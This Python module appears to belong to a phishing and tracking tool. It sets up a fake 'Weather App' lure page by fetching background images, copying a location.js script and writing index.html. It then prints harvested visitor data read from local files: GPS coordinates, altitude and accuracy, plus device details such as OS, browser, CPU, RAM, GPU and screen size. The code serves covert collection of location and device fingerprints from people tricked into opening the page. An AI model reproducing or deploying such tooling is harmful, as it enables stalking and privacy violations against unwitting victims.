#!/usr/bin/env python3
"""
WeatherApp Template Module
Author: TranQuyTai
"""

import os
import sys
import time
import json
import base64
import asyncio
import requests
import subprocess
import shutil
import logging
from pathlib import Path

# Thiết lập logging
logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

CUR_PATH = Path(__file__).parent.absolute()
ROOT_PATH = Path(CUR_PATH).parent.parent
TEMP_DIR = os.path.join(ROOT_PATH, "template", "weatherapp")
LOG_DIR = os.path.join(ROOT_PATH, "logs")
DB_DIR = os.path.join(ROOT_PATH, "db")
INFO_PATH = os.path.join(DB_DIR, "info.txt")
RESULT_PATH = os.path.join(DB_DIR, "results.txt")

def module_start(server_port):
    """
    Khởi động module Weather App
    """
    # Chuẩn bị thư mục
    create_directory()
    
    # Tải ảnh nền
    download_backgrounds()
    
    # Tạo index.html
    create_website(server_port)
    
    # Báo cáo
    print("[+] Trang web Weather App đã sẵn sàng!")
    
    logger.info("Weather App module started")
    return

def create_directory():
    """
    Tạo các thư mục cần thiết nếu chưa tồn tại
    """
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        logger.info(f"Created directory: {LOG_DIR}")
    
    if not os.path.exists(DB_DIR):
        os.makedirs(DB_DIR)
        logger.info(f"Created directory: {DB_DIR}")
    
    logger.info("Directory structure checked")

def download_backgrounds():
    """
    Tải các ảnh nền cho Weather App
    """
    mount_url = "https://images.unsplash.com/photo-1506744038136-46273834b3fb"
    dark_url = "https://images.unsplash.com/photo-1519681393784-d120267933ba"
    place_icon_url = "https://cdn-icons-png.flaticon.com/512/1865/1865269.png"
    
    # Tạo thư mục assets nếu chưa tồn tại
    assets_dir = os.path.join(TEMP_DIR, "assets")
    if not os.path.exists(assets_dir):
        os.makedirs(assets_dir)
        logger.info(f"Created assets directory: {assets_dir}")
        
    # Tải ảnh nền giao diện sáng
    if not os.path.exists(os.path.join(assets_dir, "mount.jpg")):
        try:
            r = requests.get(mount_url, stream=True)
            if r.status_code == 200:
                with open(os.path.join(assets_dir, "mount.jpg"), 'wb') as f:
                    r.raw.decode_content = True
                    shutil.copyfileobj(r.raw, f)
                logger.info("Downloaded light theme background")
        except Exception as e:
            logger.error(f"Failed to download light theme background: {str(e)}")
    
    # Tải ảnh nền giao diện tối
    if not os.path.exists(os.path.join(assets_dir, "darkk.jpg")):
        try:
            r = requests.get(dark_url, stream=True)
            if r.status_code == 200:
                with open(os.path.join(assets_dir, "darkk.jpg"), 'wb') as f:
                    r.raw.decode_content = True
                    shutil.copyfileobj(r.raw, f)
                logger.info("Downloaded dark theme background")
        except Exception as e:
            logger.error(f"Failed to download dark theme background: {str(e)}")
    
    # Tải biểu tượng vị trí
    if not os.path.exists(os.path.join(assets_dir, "place.png")):
        try:
            r = requests.get(place_icon_url, stream=True)
            if r.status_code == 200:
                with open(os.path.join(assets_dir, "place.png"), 'wb') as f:
                    r.raw.decode_content = True
                    shutil.copyfileobj(r.raw, f)
                logger.info("Downloaded place icon")
        except Exception as e:
            logger.error(f"Failed to download place icon: {str(e)}")

def create_website(port):
    """
    Tạo file index.html cho Weather App
    """
    # Đảm bảo thư mục js tồn tại
    if not os.path.exists(os.path.join(TEMP_DIR, "js")):
        os.makedirs(os.path.join(TEMP_DIR, "js"))
    
    # Copy file location.js từ thư mục gốc vào thư mục js của template
    src_location_js = os.path.join(ROOT_PATH, "js", "location.js")
    dst_location_js = os.path.join(TEMP_DIR, "js", "location.js")
    try:
        shutil.copy2(src_location_js, dst_location_js)
        logger.info("Copied location.js to template directory")
    except Exception as e:
        logger.error(f"Failed to copy location.js: {str(e)}")
    
    # Tạo file index.html từ index_temp.html
    try:
        with open(os.path.join(TEMP_DIR, "index_temp.html"), 'r') as temp_file:
            template = temp_file.read()
        
        # Ghi ra file index.html
        with open(os.path.join(TEMP_DIR, "index.html"), 'w') as index_file:
            index_file.write(template)
            logger.info("Created index.html for Weather App")
    except Exception as e:
        logger.error(f"Failed to create index.html: {str(e)}")

def locate_ip():
    """
    Lưu thông tin vị trí từ file results.txt
    """
    print('[+] Đọc dữ liệu từ results.txt...')
    
    if os.path.exists(RESULT_PATH):
        with open(RESULT_PATH, 'r') as file:
            data = file.read().strip()
            if data:
                # In ra thông tin vị trí
                print("\n[+] Thông tin vị trí người dùng:")
                try:
                    json_data = json.loads(data)
                    print(f"  [*] Vĩ độ  : {json_data.get('Latitude', 'Không có')}")
                    print(f"  [*] Kinh độ: {json_data.get('Longitude', 'Không có')}")
                    print(f"  [*] Độ cao : {json_data.get('Altitude', 'Không có')}")
                    print(f"  [*] Độ chính xác: {json_data.get('Accuracy', 'Không có')}")
                    print(f"  [*] Nguồn dữ liệu: {json_data.get('Source', 'auto')}")
                except json.JSONDecodeError:
                    print("  [!] Dữ liệu không hợp lệ")
            else:
                print("  [!] Không có dữ liệu vị trí")
    else:
        print("  [!] File results.txt không tồn tại")

def device_info():
    """
    Lưu thông tin thiết bị từ file info.txt
    """
    print('[+] Đọc dữ liệu từ info.txt...')
    
    if os.path.exists(INFO_PATH):
        with open(INFO_PATH, 'r') as file:
            data = file.read().strip()
            if data:
                # In ra thông tin thiết bị
                print("\n[+] Thông tin thiết bị người dùng:")
                try:
                    json_data = json.loads(data)
                    print(f"  [*] Hệ điều hành : {json_data.get('Operating System', 'Không có')}")
                    print(f"  [*] Trình duyệt  : {json_data.get('Browser', 'Không có')}")
                    print(f"  [*] Số lõi CPU   : {json_data.get('CPU Cores', 'Không có')}")
                    print(f"  [*] RAM          : {json_data.get('RAM', 'Không có')}")
                    print(f"  [*] GPU          : {json_data.get('GPU Renderer', 'Không có')}")
                    print(f"  [*] Độ phân giải : {json_data.get('Screen Width', 'Không có')} x {json_data.get('Screen Height', 'Không có')}")
                except json.JSONDecodeError:
                    print("  [!] Dữ liệu không hợp lệ")
            else:
                print("  [!] Không có dữ liệu thiết bị")
    else:
        print("  [!] File info.txt không tồn tại")
